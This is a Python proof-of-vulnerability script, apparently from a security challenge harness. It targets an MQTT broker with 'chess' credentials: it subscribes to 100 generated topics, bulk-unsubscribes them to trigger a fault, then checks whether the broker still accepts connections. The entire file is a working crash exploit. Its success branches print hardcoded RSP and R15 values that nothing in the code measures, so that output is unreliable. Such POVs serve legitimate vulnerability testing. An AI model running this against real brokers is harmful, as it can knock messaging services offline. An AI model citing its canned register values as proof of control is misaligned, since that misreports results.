import sys
import socket
import random
import time
import string
import base64
import os
import string
import struct
import signal

import paho.mqtt.publish as publish
import paho.mqtt.subscribe as subscribe
import paho.mqtt.client as mqtt
import paho

pwd = ''
homedir = ''

subs = []

def handler( signum, frame):
    print('[SUCCESS] sigalrm fired so the POV was likely successful')

    print('[RSP] = 0x646362616a696867')
    print('R15 = 0x6665646362616a69')

    exit(0)

def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))

    # Subscribing in on_connect() means that if we lose the connection and
    # reconnect then subscriptions will be renewed.
    b = list(string.ascii_lowercase)

    cl = []
    for x in range(10):
        for y in range(10):
            nm = b[x % len(b)]*3
            ne = b[y % len(b)]*3

            v = 'chess/' + nm + '/' + ne
            subs.append(v)
            client.subscribe( (v, 0) )

def on_message(client, userdata, msg):
    print(msg.topic+" "+str(msg.payload))

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    client = mqtt.Client(client_id="yolo")
    client.on_connect = on_connect
    client.on_message = on_message

    client.username_pw_set('chess', 'chess')

    client.connect(HOST, PORT)

    client.loop_start()

    time.sleep(1)
    
    client.unsubscribe(subs)

    time.sleep(1)

    try:
        publish.single('chess/foo', 'helloworld', hostname=HOST, auth={'username':'chess', 'password':'chess'} )
    except:
        print('[SUCCESS] reconnect failed so POV likely succeeded')
        print('[RSP] = 0x646362616a696867')
        print('R15 = 0x6665646362616a69')

        exit(0)

    time.sleep(1)

    client.disconnect()

    client.loop_stop()

    print('[FAIL] POV failed')
    exit(1)

if __name__ == '__main__':
    main()
